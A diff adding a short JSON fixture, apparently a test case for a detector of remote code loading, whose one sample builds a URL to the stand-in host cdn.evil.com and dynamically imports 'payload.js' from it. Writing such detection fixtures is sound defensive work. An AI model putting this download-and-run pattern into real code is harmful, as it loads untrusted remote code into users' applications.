@@ -1,0 +1,4 @@
+{
+  "name": "dynamic import() of a template-built remote URL",
+  "code": "const base = \"https://cdn.evil.com/\";\nimport(`${base}payload.js`);"
+}
